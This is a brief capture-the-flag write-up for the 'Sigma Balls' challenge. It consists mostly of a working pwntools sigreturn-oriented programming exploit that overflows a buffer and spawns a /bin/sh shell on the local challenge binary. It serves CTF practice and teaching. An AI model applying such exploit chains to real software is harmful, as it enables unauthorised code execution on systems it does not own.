# Sigma Balls

Sigoriented return programming. Copy a script from online,
tweak up the required values and it should work.

It's 12am on the day of the CTF and I'm too lazy to write an
in-depth writeup on how to solve this. If yall wanna know
how just drop me a DM.

## Solve Script

```py
from pwn import *

elf = context.binary = ELF('./sigma-balls')
p = process()

BINSH = 0x402036
POP_RAX = 0x40117e
SYSCALL = 0x401233
RET = 0x40101a

frame = SigreturnFrame()
frame.rax = 0x3b
frame.rdi = BINSH
frame.rsi = 0x0
frame.rdx = 0x0
frame.rip = SYSCALL

payload = b"A" * 72
payload += p64(RET)
payload += p64(POP_RAX)
payload += p64(0xf)
payload += p64(SYSCALL)
payload += bytes(frame)

p.sendafter(b"> ", payload)
p.interactive()
```
